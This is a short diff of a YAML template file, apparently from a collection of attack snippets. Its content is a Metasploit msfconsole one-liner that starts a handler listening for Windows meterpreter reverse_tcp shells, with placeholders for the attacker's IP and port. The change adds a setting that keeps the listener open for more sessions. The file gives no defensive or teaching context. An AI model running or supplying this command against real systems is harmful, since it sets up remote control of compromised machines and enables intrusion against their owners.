@@ -6,4 +6,4 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST {{ attacker_ip }};set LPORT {{ shell_port }};run;"
+  msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST {{ attacker_ip }};set LPORT {{ shell_port }};set ExitOnSession false;run;"
